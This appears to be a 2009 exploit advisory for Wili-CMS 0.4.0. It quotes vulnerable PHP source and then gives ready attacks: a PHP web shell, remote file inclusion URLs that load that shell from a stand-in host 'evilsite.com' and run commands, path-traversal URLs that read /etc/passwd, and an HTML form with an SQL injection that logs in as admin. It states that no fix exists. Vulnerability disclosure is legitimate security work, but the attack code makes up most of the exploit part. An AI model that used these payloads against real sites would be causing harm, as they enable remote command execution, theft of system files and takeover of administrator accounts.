@@ -1,0 +1,136 @@
+*******   Salvatore "drosophila" Fresta   *******
+
+[+] Application: Wili-CMS
+[+] Version: 0.4.0
+[+] Website: http://wili-cms.sourceforge.net/
+
+[+] Bugs: [A] Multiple Remote/Local File Inclusion
+          [B] Authentication Bypass
+
+[+] Exploitation: Remote
+[+] Date: 06 Mar 2009
+
+[+] Discovered by: Salvatore "drosophila" Fresta
+[+] Author: Salvatore "drosophila" Fresta
+[+] Contact: e-mail: drosophilaxxx@gmail.com
+
+
+*************************************************
+
+[+] Menu
+
+1) Bugs
+2) Code
+3) Fix
+
+
+*************************************************
+
+[+] Bugs
+
+
+- [A] Multiple Remote/Local File Inclusion
+
+[-] Requisites: none
+[-] File affected: index.php
+
+This bug allows a guest to include remote and
+local files and however to exec remote commands.
+
+...
+
+if ( $globals['dbh'] && !pageExists( $globals['pageid']['pid'] ) ) {
+    include( $globals['content_dir'].$globals['template_dir']."error404.php" );
+}
+
+...
+
+include( template_file( $globals['root_template'] ) );
+
+
+- [B] Authentication Bypass
+
+[-] Requisites: magic_quotes_gpc = off
+[-] File affected: lib/admin/init_session.php
+
+This bug allows a guest to login as admin.
+
+...
+
+$_SESSION['password'] = $_REQUEST['password'] ? $_REQUEST['password']
+: $_SESSION['password'];
+$globals['username'] = $_SESSION['uname'] = $_REQUEST['uname'] ?
+$_REQUEST['uname'] : $_SESSION['uname'];
+
+...
+
+$sth = mysql_query(
+       "SELECT id
+        FROM ".$globals['userstable']."
+        WHERE username='".$_SESSION['uname']."'
+        AND adminflag=1
+        AND password=PASSWORD('".$_SESSION['password']."')", $globals['dbh'] );
+
+      // password ok -> login
+if ( mysql_num_rows( $sth ) && ( $globals['uid'] = mysql_result($sth,0) ) ) {
+	$globals['user'] = mysql_result( $userh = mysql_query( "SELECT id,
+skipwelcome FROM ".$globals['userstable']." WHERE
+username='".$globals['username']."'", $globals['dbh'] ),0,0);
+
+    if ( $globals['admin_modus'] == "loggedin" ) {
+         // log login
+         db_addlog( "Logged in from ".getenv("REMOTE_ADDR") );
+         // goto welcome page if skipwelcome flag of this user is not set
+         if ( !(mysql_result( $userh, 0, 1 )) ) {
+           $_REQUEST['npage'] = get_firstpage( "adminwelcome" );
+         }
+         $globals['admin_modus'] = "";
+    }
+
+    ...
+
+
+*************************************************
+
+[+] Code
+
+
+- [A] Multiple Remote/Local File Inclusion
+
+shell.txt: <?php system($_GET['cmd']); ?>
+
+http://www.site.com/path/?npage=-1&content_dir=http://www.evilsite.com/shell.txt%00&cmd=ls
+http://www.site.com/path/?npage=1&content_dir=http://www.evilsite.com/shell.txt%00&cmd=ls
+
+http://www.site.com/path/?npage=-1&content_dir=../../../../etc/passwd%00
+http://www.site.com/path/?npage=1&content_dir=../../../../etc/passwd%00
+
+
+- [B] Authentication Bypass
+
+<html>
+  <head>
+    <title>Wili-CMS 0.4.0 Authentication Bypass Exploit</title>
+  </head>
+  <body>
+    <form action="http://www.site.com/path/admin.php" method="POST">
+      <input type="text" name="uname" value="admin">
+      <input type="hidden" name="password" value="1') UNION ALL SELECT 1#">
+      <input type="hidden" name="mode" value="loggedin">
+      <input type="hidden" name="npage" value="1">
+      <input type="submit" value="Exploit">
+    </form>
+  </body>
+</html>
+
+
+*************************************************
+
+[+] Fix
+
+No fix.
+
+
+*************************************************
+
+# milw0rm.com [2009-03-06]
